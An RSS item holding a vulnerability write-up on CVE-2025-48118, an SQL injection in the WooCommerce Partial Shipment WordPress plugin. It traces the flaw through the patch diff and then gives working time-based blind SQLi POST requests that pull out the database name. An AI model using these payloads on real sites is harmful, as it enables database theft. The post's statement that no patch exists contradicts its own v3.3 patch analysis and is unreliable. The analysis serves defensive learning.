      <link>http://localhost:1313/posts/2025-09-29-cve-2025-48118/</link>
      <pubDate>Mon, 29 Sep 2025 19:54:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-09-29-cve-2025-48118/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-09-29-cve-2025-48118/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;The vulnerability occurs in the &lt;strong&gt;Woocommerce Partial Shipment&lt;/strong&gt; plugin for WordPress prior to version &lt;strong&gt;3.3&lt;/strong&gt;.&lt;br&gt;&#xA;It allows attackers to directly interact with the database, potentially leading to data theft and other attacks.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-48118&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-48118&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/wc-partial-shipment/advanced/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Woocommerce Partial Shipment Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: SQL Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS Severity&lt;/strong&gt;: High (8.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subscriber&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Woocommerce Partial Shipment&lt;/strong&gt;: v3.2 (vulnerable) and v3.3 (patched)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool&lt;/strong&gt;: &lt;strong&gt;meld&lt;/strong&gt; or any comparison tool to view differences between versions&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Activated WooCommerce Plugin&lt;/strong&gt;: must be &lt;strong&gt;activated&lt;/strong&gt; before installing &lt;strong&gt;Woocommerce Partial Shipment Plugin&lt;/strong&gt;, since several WooCommerce functions are used.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The root cause lies in directly injecting &lt;strong&gt;POST&lt;/strong&gt; request data into an SQL query without proper sanitization or validation.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Use any diff tool to compare the vulnerable and patched versions.&lt;br&gt;&#xA;A significant difference appears in &lt;strong&gt;wc-partial-shipment/woocommerce-partial-shipment.php&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;However, since the developer made many changes, locating the vulnerable line can be difficult.&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;In WordPress, for SQLi to occur, the application must interact with the database using the global variable &lt;code&gt;$wpdb&lt;/code&gt;.&lt;br&gt;&#xA;Searching for this keyword inside &lt;strong&gt;wc-partial-shipment/woocommerce-partial-shipment.php&lt;/strong&gt; helps identify possible sinks.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-09-29-cve-2025-48118/search_sink.png&#34; title=&#34;Sink location found in source code&#34; data-thumbnail=&#34;/posts/2025-09-29-cve-2025-48118/search_sink.png&#34; data-sub-html=&#34;&lt;h2&gt;search sink&lt;/h2&gt;&lt;p&gt;Sink location found in source code&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-09-29-cve-2025-48118/search_sink.png&#39; alt=&#34;search sink&#34; height=&#34;469&#34; width=&#34;1067&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Sink location found in source code&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;get_shipment_id&lt;/code&gt; and &lt;code&gt;get_wxp_shipment_data&lt;/code&gt; are two functions in the &lt;strong&gt;WXP_Partial_Shipment&lt;/strong&gt; class that directly insert user input into SQL queries without validation, making them vulnerable to SQL Injection.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-09-29-cve-2025-48118/patch.png&#34; title=&#34;Comparison between vulnerable and patched version&#34; data-thumbnail=&#34;/posts/2025-09-29-cve-2025-48118/patch.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch&lt;/h2&gt;&lt;p&gt;Comparison between vulnerable and patched version&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-09-29-cve-2025-48118/patch.png&#39; alt=&#34;Patch&#34; height=&#34;508&#34; width=&#34;1261&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Comparison between vulnerable and patched version&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The patch uses &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; to safely construct SQL queries instead of &lt;strong&gt;direct string concatenation&lt;/strong&gt; with user input.&lt;br&gt;&#xA;This ensures all values are &lt;strong&gt;properly escaped&lt;/strong&gt; before being inserted into the SQL query, effectively mitigating SQL Injection risks.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-works&#34;&gt;&lt;span&gt;How it works&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-works&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Both &lt;code&gt;get_shipment_id&lt;/code&gt; and &lt;code&gt;get_wxp_shipment_data&lt;/code&gt; are called by the function &lt;code&gt;wxp_order_set_shipped&lt;/code&gt; within the same class.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function wxp_order_set_shipped(){&#xA;    $order_id = isset($_POST[&amp;#39;order_id&amp;#39;]) ? $_POST[&amp;#39;order_id&amp;#39;] : 0;&#xA;    // other logic&#xA;&#xA;    $wxp_shipment = $this-&amp;gt;get_wxp_shipment_data($order_id);&#xA;    if(isset($_POST[&amp;#39;order_id&amp;#39;]) &amp;amp;&amp;amp; $_POST[&amp;#39;order_id&amp;#39;]){&#xA;        global $wpdb;&#xA;        $shipment_id = $this-&amp;gt;get_shipment_id($_POST[&amp;#39;order_id&amp;#39;]);&#xA;        if(!$shipment_id){&#xA;            $data = array(&#xA;                &amp;#39;order_id&amp;#39; =&amp;gt;$order_id,&#xA;                &amp;#39;shipment_id&amp;#39; =&amp;gt;1,&#xA;                &amp;#39;shipment_url&amp;#39;=&amp;gt;&amp;#39;&amp;#39;,&#xA;                &amp;#39;shipment_num&amp;#39;=&amp;gt;&amp;#39;&amp;#39;,&#xA;                &amp;#39;shipment_date&amp;#39;=&amp;gt;current_time(&amp;#39;timestamp&amp;#39;,0),&#xA;            );&#xA;            $wpdb-&amp;gt;insert($wpdb-&amp;gt;prefix.&amp;#34;partial_shipment&amp;#34;,$data,array(&amp;#39;%d&amp;#39;,&amp;#39;%d&amp;#39;,&amp;#39;%s&amp;#39;,&amp;#39;%s&amp;#39;,&amp;#39;%s&amp;#39;));&#xA;            $shipment_id = $wpdb-&amp;gt;insert_id;&#xA;        }&#xA;    // other logic     &#xA;    }&#xA;&#xA;    echo json_encode(array(&amp;#39;order_id&amp;#39;=&amp;gt;$order_id,&amp;#39;status&amp;#39;=&amp;gt;$status_key));&#xA;    exit();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 The &lt;code&gt;order_id&lt;/code&gt; parameter is taken directly from the &lt;strong&gt;POST request&lt;/strong&gt;, making it user-controlled and allowing it to be passed into vulnerable SQL queries within &lt;code&gt;get_shipment_id&lt;/code&gt; and &lt;code&gt;get_wxp_shipment_data&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;To find where &lt;code&gt;wxp_order_set_shipped&lt;/code&gt; is called, search for the keyword &lt;code&gt;wxp_order_set_shipped&lt;/code&gt; inside the plugin directory.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-09-29-cve-2025-48118/search_1.png&#34; title=&#34;Location of wxp_order_set_shipped function call&#34; data-thumbnail=&#34;/posts/2025-09-29-cve-2025-48118/search_1.png&#34; data-sub-html=&#34;&lt;h2&gt;Search 1&lt;/h2&gt;&lt;p&gt;Location of wxp_order_set_shipped function call&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-09-29-cve-2025-48118/search_1.png&#39; alt=&#34;Search 1&#34; height=&#34;586&#34; width=&#34;1354&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Location of wxp_order_set_shipped function call&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;wxp_order_set_shipped&lt;/code&gt; is registered in the class constructor as a callback for the &lt;code&gt;wp_ajax_wxp_order_set_shipped&lt;/code&gt; hook, meaning it can be triggered by authenticated users.&lt;/p&gt;&#xA;&lt;p&gt;👉 Accessing &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; with the parameters:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;action=wxp_order_set_shipped&amp;amp;order_id=payload_here&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;will trigger the following:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;The callback &lt;code&gt;wxp_order_set_shipped&lt;/code&gt; executes.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;order_id&lt;/code&gt; is taken directly from the request and inserted into SQL queries.&lt;/li&gt;&#xA;&lt;li&gt;The query executes twice due to its usage in two separate SQL calls containing the malicious payload.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;detecting-sqli&#34;&gt;&lt;span&gt;Detecting SQLi&lt;/span&gt;&#xA;  &lt;a href=&#34;#detecting-sqli&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Send a &lt;strong&gt;POST request&lt;/strong&gt; containing an SQLi payload:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;Cookie: cookie_here&#xA;&#xA;action=wxp_order_set_shipped&amp;amp;order_id=(SELECT 1 FROM (SELECT SLEEP(5))a)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This results in the query:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;SELECT id as ship_id FROM wp_partial_shipment WHERE order_id=(SELECT 1 FROM (SELECT SLEEP(5))a)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Because the query executes twice, the response time doubles.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-09-29-cve-2025-48118/time_resp.png&#34; title=&#34;Response time after successful exploitation&#34; data-thumbnail=&#34;/posts/2025-09-29-cve-2025-48118/time_resp.png&#34; data-sub-html=&#34;&lt;h2&gt;time response&lt;/h2&gt;&lt;p&gt;Response time after successful exploitation&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-09-29-cve-2025-48118/time_resp.png&#39; alt=&#34;time response&#34; height=&#34;247&#34; width=&#34;376&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Response time after successful exploitation&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;A &lt;strong&gt;subquery in the FROM clause&lt;/strong&gt; is used because MySQL treats it as a temporary table.&#xA;The subquery executes once to create the temporary table, and the main query runs afterward.&#xA;This ensures the &lt;code&gt;SLEEP&lt;/code&gt; function runs only once instead of being multiplied across multiple comparisons.&lt;/p&gt;&#xA;&lt;p&gt;For example, using the following payload:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;Cookie: cookie_here&#xA;&#xA;action=wxp_order_set_shipped&amp;amp;order_id=(SELECT SLEEP(5))&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The response time increases exponentially.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-09-29-cve-2025-48118/search_2.png&#34; title=&#34;Exponential response time increase&#34; data-thumbnail=&#34;/posts/2025-09-29-cve-2025-48118/search_2.png&#34; data-sub-html=&#34;&lt;h2&gt;search 2&lt;/h2&gt;&lt;p&gt;Exponential response time increase&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-09-29-cve-2025-48118/search_2.png&#39; alt=&#34;search 2&#34; height=&#34;209&#34; width=&#34;364&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Exponential response time increase&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;extracting-the-first-letter-of-the-database-name&#34;&gt;&lt;span&gt;Extracting the First Letter of the Database Name&lt;/span&gt;&#xA;  &lt;a href=&#34;#extracting-the-first-letter-of-the-database-name&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;The first step in data extraction is confirming at least one character of the &lt;strong&gt;database name&lt;/strong&gt; — once retrieved, the rest can be dumped easily.&lt;/p&gt;&#xA;&lt;p&gt;Send a request with the following &lt;strong&gt;SQLi payload&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;Cookie: cookie_here&#xA;&#xA;action=wxp_order_set_shipped&amp;amp;order_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here, &lt;code&gt;SUBSTRING()&lt;/code&gt; extracts the first letter of the &lt;strong&gt;database name&lt;/strong&gt;, and &lt;code&gt;IF()&lt;/code&gt; triggers &lt;code&gt;SLEEP(5)&lt;/code&gt; if it equals &lt;code&gt;0x77&lt;/code&gt; (&amp;lsquo;w&amp;rsquo;).&lt;/p&gt;&#xA;&lt;p&gt;Hex encoding (&lt;code&gt;0x77&lt;/code&gt;) is used for &lt;code&gt;&#39;w&#39;&lt;/code&gt; because the &lt;code&gt;order_id&lt;/code&gt; parameter, being a &lt;strong&gt;POST&lt;/strong&gt; value, is escaped by &lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/sql-injection/#magic-quotes&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;magic quotes&lt;/a&gt; and &lt;code&gt;sanitize_text_field&lt;/code&gt; in WordPress.&lt;/p&gt;&#xA;&lt;p&gt;👉 Based on the delayed response, we confirm that the first character is &lt;code&gt;&#39;w&#39;&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;CVE-2025-48118&lt;/strong&gt; vulnerability in the WordPress &lt;strong&gt;Woocommerce Partial Shipment&lt;/strong&gt; plugin (versions before 3.3) originates from directly inserting unsanitized user input into SQL queries, resulting in a &lt;strong&gt;SQL Injection&lt;/strong&gt; vulnerability.&lt;/p&gt;&#xA;&lt;p&gt;No official patch has been released at the time of writing.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key Takeaways:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Always validate and sanitize user input.&lt;/li&gt;&#xA;&lt;li&gt;Use &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; for database operations in WordPress to prevent SQL Injection.&lt;/li&gt;&#xA;&lt;li&gt;Keep plugins updated and perform regular security audits to avoid being an attack target.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/sql-injection/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SQL Injection Cheat Sheet - PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/wc-partial-shipment/vulnerability/wordpress-woocommerce-partial-shipment-3-2-sql-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Woocommerce Partial Shipment Plugin &amp;lt;= 3.2 vulnerable to SQL Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
